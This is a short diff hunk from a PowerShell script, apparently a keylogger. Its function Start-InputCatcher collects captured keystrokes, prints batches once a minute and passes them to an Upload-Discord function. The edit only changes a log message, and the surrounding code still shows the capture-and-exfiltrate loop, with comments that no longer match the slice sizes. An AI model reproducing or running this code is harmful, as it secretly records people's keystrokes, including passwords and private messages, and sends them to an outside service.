@@ -76,7 +76,7 @@ function Start-InputCatcher {
             $currentMinute = (Get-Date).Minute
             if ($currentMinute -ne $lastMinute) {
                 $firstTwoThousandKeys = $capturedKeys[0..20] -join ''
-                Write-Host "First 2000 Captured Keys: $firstTwoThousandKeys" -ForegroundColor Green
+                Write-Host "First 20 Captured Keys: $firstTwoThousandKeys" -ForegroundColor Green
                 Upload-Discord -text $firstTwoThousandKeys
                 $capturedKeys = $capturedKeys[21..($capturedKeys.Count - 1)]  # Remove the first 2000 keys
                 $lastMinute = $currentMinute
